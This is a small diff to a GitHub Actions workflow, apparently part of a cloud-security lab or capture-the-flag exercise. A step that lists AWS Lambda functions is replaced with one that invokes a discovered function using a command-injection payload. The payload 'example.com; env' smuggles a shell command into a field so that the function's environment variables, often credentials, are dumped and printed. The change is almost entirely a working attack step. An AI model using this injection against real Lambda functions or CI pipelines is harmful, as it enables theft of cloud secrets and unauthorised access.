@@ -27,5 +27,13 @@ jobs:
           aws-region: us-east-1
 
       # If access is granted, run this command to find the secret Lambda
-      - name: List Lambda Functions
-        run: aws lambda list-functions
+      - name: Invoke Lambda and Inject Command
+        run: |
+          aws lambda invoke \
+            --function-name <שם_הלמבדה_שמצאת> \
+            --cli-binary-format raw-in-base64-out \
+            --payload '{"domain": "example.com; env"}' \
+            response.json
+            
+          echo "Lambda Response:"
+          cat response.json
